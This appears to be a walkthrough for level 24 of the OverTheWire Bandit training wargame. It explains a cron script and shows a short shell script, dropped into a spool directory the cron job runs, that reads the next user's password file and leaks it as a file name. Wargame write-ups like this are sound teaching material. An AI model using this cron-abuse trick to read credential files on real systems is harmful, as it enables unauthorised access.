---
title: "Level 24"
# weight: 1
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
---
# Over The Wire - Bandit - Level 24

## Level Goal
> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
> 
> NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
> 
> NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level
> chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

## Steps

The way to find the script inside the cron.d folder is the same as the last 2 levels (level 22 and level 23). After you find the script `cronjob_bandit24.sh` analyze it, if you didn't understand a part of it, check the following commented code block:

```shell 
#!/bin/bash # Run as a bash script

myname=$(whoami) # save into the variable "myname" the current user

cd /var/spool/$myname/foo # Enter in a directory called "foo"
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*; # Loop through all the files in the folder
do
    if [ "$i" != "." -a "$i" != ".." ]; # If it's not a directory
    then
        echo "Handling $i" # Current script to handle
        owner="$(stat --format "%U" ./$i)" # Get name of the owner of the script
        if [ "${owner}" = "bandit23" ]; then # If owner is the bandit23
            timeout -s 9 60 ./$i # run a script and hang if exceeds 1 minute
        fi
        rm -f ./$i # Remove the script
    fi
done
```

In another words, there's a script that runs from time to time that check inside the `/var/spool/bandit24/foo/` directory for scripts and run them if the owner is bandit23. After running the script, it deletes the script.

The way to solve this problem is to copy a self-made shell script to the `/var/spool/bandit24/foo/` directory that retrieves the password for the next level. So, first let's create a shell script called `getpass.sh` inside a temporary folder using `mktemp -d` command, you can edit the text in your favorite text editor (nano, vim, etc...).

The script I wrote is the following:

```shell 
#!/bin/bash

result=$(cat /etc/bandit_pass/bandit24)
echo "res" > /tmp/tmp.tempfolderhash/$result
```

Where:
- `#!/bin/bash` : tells the runner to use the bash
- `result=$(cat /etc/bandit_pass/bandit24)` : save the bandit24 password into a variable called "result"
- `echo "res" > /tmp/tmp.tempfolderhash/$result` : save a file in the temp folder with the password as the filename, just like in the last level script. ("res" is a discard argument for echo, you could use `touch`)

Now, change the permissions to be executable from other users using `chmod a+x getpass.sh`, and copy the script to the `/var/spool/bandit24/foo/` using the `cp` command:

```shell
cp ./getpass.sh /var/spool/bandit24/foo/getpass.sh
```

Now, just wait a little and the password for the next level will appear as a file in your created temporary directory.
